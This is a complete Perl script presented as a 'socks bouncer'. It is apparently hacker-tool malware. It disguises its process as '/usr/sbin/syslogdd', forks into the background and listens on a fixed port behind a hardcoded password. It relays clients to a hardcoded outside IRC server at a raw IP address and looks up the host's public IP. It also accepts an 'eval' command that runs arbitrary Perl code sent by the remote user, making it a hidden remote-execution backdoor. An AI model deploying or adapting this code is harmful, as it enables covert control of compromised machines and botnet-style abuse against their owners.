#!/usr/bin/perl

# Socks bouncer FCK[u]
# This creates a listening sock in the defined port in $PORT
# you should

my $PASSWD     = "\@wSxDr%tGbHu";
my $PORT       = "43314";
my $FAKEPROC   = "/usr/sbin/syslogdd";
my $PIDFILE    = '';
my $URL     = 'http://ip-addr.es';
my $port = 6667;
my $serv = "195.78.229.104";

use LWP::Simple;
my $IPADDR    = get $URL;
chomp($IPADDR);
my $success   = "\n [o] FCK[u] perl bounce 1.0 [$FAKEPROC:$$]\n [o] Listening on IP:Port $IPADDR:$PORT ...\n\n";
print $success;
$0 = $FAKEPROC."\0";

use IO::Socket;
use IO::Select;
use strict;

my $serv_sock = IO::Socket::INET->new(LocalPort => $PORT, Proto => 'tcp', Listen => 1) || die "[!] Error: $!";

my $PID = fork;
exit if $PID;
my $sel_con = IO::Select->new();
my $sel_serv = IO::Select->new($serv_sock);

my (%CLIENT, %SERVER);


while ( 1 ) {
  foreach my $fh ($sel_serv->can_read(0.01)) {
    if ($fh eq $serv_sock) {
      my $cli = $serv_sock->accept();
      $cli->autoflush(1);
      $sel_serv->add($cli);
      $CLIENT{$cli}->{sock} = $cli;
      $CLIENT{$cli}->{id}   = newid();
      $CLIENT{$cli}->{tmp}  = '';
      next;
    }

    my $got_msg = '';

    while (is_ready($fh, 0.1)) {
      my $msg = '';
      my $nread = sysread($fh, $msg, 1024);

      if ($nread == 0) {
        my $cliserv = $CLIENT{$fh}->{serv} if (defined($CLIENT{$fh}->{serv}));

        $sel_serv->remove($fh);
 
        if ($cliserv) {
           sendsock($cliserv, $got_msg, 1) if (length($got_msg) > 0);
           sendsock($cliserv, "QUIT :FCK[u]'s hell");

           $sel_con->remove($cliserv);
           $cliserv->close();
           delete($SERVER{$cliserv});
        }

        $got_msg = '';
        delete($CLIENT{$fh});
        last;
      }

      $got_msg .= $msg;
    }

    $got_msg =~ s/\r\n/\n/g;
    $got_msg =~ s/\n/\r\n/g;

    next unless(length($got_msg) > 0);

    foreach my $msg (split(/\n/, $got_msg)) {
      $msg =~ s/\r/\r\n/g;

      if (not defined($CLIENT{$fh}->{passwd}) and $msg =~ /^PASS\s+(.+?)\r/i) {
        my $clipass = $1;
        $CLIENT{$fh}->{passwd} = 1 if ( ($clipass eq $PASSWD) );
        if (not defined($CLIENT{$fh}->{passwd})) {
           sendsock($fh, "NOTICE AUTH :*** Incorrect password!");
        } else {
            connect_serv($serv, $port, $fh);
        }
      } else {
          parse_client($fh, $msg) if ($fh);
      }
    }
  }

  foreach my $fh ($sel_con->can_read(0.01)) {
    my $got_msg = '';

    while (is_ready($fh, 0.1)) {
      my $msg;
      my $nread = sysread($fh, $msg, 1024);

      if ($nread == 0) {
        my $cliserv = $SERVER{$fh}->{cli} if (defined($SERVER{$fh}->{cli}));
        $sel_con->remove($fh);

        sendsock($cliserv, $got_msg, 1) if (length($got_msg) > 0 and defined($cliserv));
        $got_msg = '';

        if ($cliserv) {
          $sel_serv->remove($cliserv);
          $cliserv->close();
          delete($CLIENT{$cliserv});
        }


        delete($SERVER{$fh});
        last;
      }

      $got_msg .= $msg;
    }

    next unless(length($got_msg) > 0);

    $got_msg =~ s/\r\n/\n/g;
    $got_msg =~ s/\n/\r\n/g;

    foreach my $msg (split(/\n/, $got_msg)) {
      $msg =~ s/\r/\r\n/;
      parse_serv($fh, $msg) if ($fh);
    }
  }
}


sub parse_client {
  my ($cli, $msg) = @_;

  my $Command = $msg;
  $Command =~ s/\n$//;
  $Command =~ s/\r$//;
  my @args = split(/ +/, $Command);
  $Command = lc($args[0]);
  return(undef) if (not defined($CLIENT{$cli}->{passwd}));

  # condicoes dos Commands internos
  if ($Command eq 'eval') {
     my $string = $msg;
     $string =~ s/^\S+\s+//;
     my (@ret) = eval "$string";
     climsg($cli, "Eval: @ret");
  } else {
    sendsock($CLIENT{$cli}->{serv}, $msg);
  }
}


sub connect_serv {
  my ($serv, $port, $cli) = @_;

  sendsock($cli, "NOTICE AUTH :*** Connecting to $serv:$port");

  my %args = (PeerAddr => $serv, PeerPort => $port, Proto => 'tcp', Timeout => 7);

  my $servsock = IO::Socket::INET->new(%args);

  if (!$servsock) {
    my $msg = "N&#65533;o Cant connect to $serv:$port";
    $msg .= " (Error: $!)";
    sendsock($cli, $msg);
    return(undef);
  }

  $servsock->autoflush(1);
  $sel_con->add($servsock);

  sendsock($servsock, "NICK ".$CLIENT{$cli}->{nick});
  sendsock($servsock, $CLIENT{$cli}->{tmp});

  $CLIENT{$cli}->{serv}        = $servsock;
  $SERVER{$servsock}->{sock}   = $servsock;
  $SERVER{$servsock}->{id}     = $CLIENT{$cli}->{id};
  $SERVER{$servsock}->{cli}    = $cli;
  $SERVER{$servsock}->{nick}   = $CLIENT{$cli}->{nick};
  $SERVER{$servsock}->{host}   = $serv;
  $SERVER{$servsock}->{port}  = $port;
  $SERVER{$servsock}->{logmsg} = '';

  sendsock($cli, "NOTICE AUTH :*** Connected!");

  return(1);
}

sub newid {
  my %ALL = ((%SERVER), (%CLIENT));

  my $id;
  for ($id = 1; ; $id++) {
    last if (!grep { $ALL{$_}->{id} == $id } keys(%ALL));
  }
  undef(%ALL);

  return($id);
}

sub is_ready {
  my ($fh, $time) = @_;
  $time = 0 unless($time);
  my $read = '';
  vec($read, fileno($fh), 1) = 1;
  my $ready = 0;
  $ready = select($read, undef, undef, $time);
  return($ready);
}

sub sendsock {
  my ($sock, $msg, $org) = @_;
  $msg .= "\r\n" if ($msg !~ /\n$/ and !$org);

  syswrite($sock, $msg, length($msg)) if ($sock);
}

sub parse_serv {
  my ($serv, $msg) = @_;

  my $cliserv = $SERVER{$serv}->{cli} if (defined($SERVER{$serv}->{cli}));;
  sendsock($cliserv, $msg);

}